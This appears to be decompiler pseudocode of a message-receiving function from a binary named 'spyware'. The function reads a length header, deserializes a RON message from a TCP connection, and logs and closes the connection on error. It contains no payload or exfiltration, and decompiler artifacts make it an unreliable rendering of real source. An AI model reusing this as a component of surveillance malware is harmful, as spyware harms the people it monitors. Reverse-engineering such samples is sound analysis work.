fn spyware::communication::server::get_message(a0: i64, a1: u64) -> int {
    let v0: u32;  // [bp-0x114]
    let v1: u64;  // [bp-0x110]
    let v2: u64;  // [bp-0x108]
    let v3: alloc::vec::Vec<u8, alloc::alloc::Global>;  // [bp-0x100], Other Possible Types: core::result::Result<core::net::socket_addr::SocketAddr, std::io::error::Error>, struct40
    let v4: u32;  // [bp-0xfe]
    let v5: u16;  // [bp-0xfa]
    let v6: u64;  // [bp-0xf8]
    let v7: u64;  // [bp-0xf0]
    let v8: u64;  // [bp-0xd8]
    let v9: u32;  // [bp-0xd6]
    let v10: u16;  // [bp-0xd2]
    let v11: u64;  // [bp-0xd0]
    let v12: u128;  // [bp-0xc8]
    let v13: i64;  // [bp-0xb8]
    let v14: u64;  // [bp-0xb0]
    let v15: i64;  // [bp-0xa8]
    let v16: u64;  // [bp-0xa0]
    let v17: struct64;  // [bp-0x98], Other Possible Types: u64
    let v18: u64;  // [bp-0x90]
    let v19: i64;  // [bp-0x88]
    let v20: u64;  // [bp-0x80]
    let v21: void*;  // [bp-0x78]
    let v22: struct64;  // [bp-0x58]
    let v23: u128;  // [bp-0x48]
    let v24: u128;  // [bp-0x38]
    let v25: u128;  // [bp-0x28]
    let v26: u128;  // [bp-0x18]
    let v28: u64;  // rax
    let v32: u64;  // rdx
    let v34: u8;  // cl

    v1 = a1;
    v0 = 0;
    v28 = std::io::default_read_exact(&v1, &v0, 4);
    if !v28 {
        v3 = <u8 as alloc::vec::spec_from_elem::SpecFromElem>::from_elem(spyware::communication::serialization::extract_msg_type_and_length(v0), v32);
        core::result::Result<T,E>::expect(std::io::default_read_exact(&v1, v6, v7));
        v17 = ron::de::from_bytes(v6, v7, v34);
        v22 = core::result::Result<T,E>::unwrap(&v17);
        return struct64 {
            field_0: v22.field_0
            field_16: v23
            field_32: v24
            field_48: v25
        };
    }
    v2 = v28;
    if core::sync::atomic::atomic_load() {
        v3 = std::net::tcp::TcpStream::peer_addr(v1);
        match v3 {
            Err(_) => {
                return struct16 {
                    field_0: 9223372036854775818
                    field_8: v6
                };
            },
            Ok(_) => {
                v10 = v5;
                v9 = v4;
                v26 = *((&v3 as &char + 16) as &i128);
                v8 = v3 as i16;
                v11 = v6;
                v12 = *((&v3 as &char + 16) as &i128);
                v13 = &v8;
                v14 = <core::net::socket_addr::SocketAddr as core::fmt::Display>::fmt;
                v15 = &v2;
                v16 = <std::io::error::Error as core::fmt::Display>::fmt;
                v17 = "An error occurred, terminating connection with ";
                v18 = 2;
                v21 = 0;
                v19 = &v13;
                v20 = 2;
                v3 = struct40 {
                    field_0: "spyware::communication::server"
                    field_16: "spyware::communication::server"
                    field_32: log::__private_api::loc("src/communication/server.rs")
                };
                log::__private_api::log(&v17, 1, &v3);
            },
        }
    }
    std::os::unix::net::datagram::UnixDatagram::shutdown(v1, 2);
    if !v6 {
        return struct16 {
            field_0: 9223372036854775818
            field_8: v2
        };
    }
    return struct16 {
        field_0: 9223372036854775818
        field_8: v6
    };
}
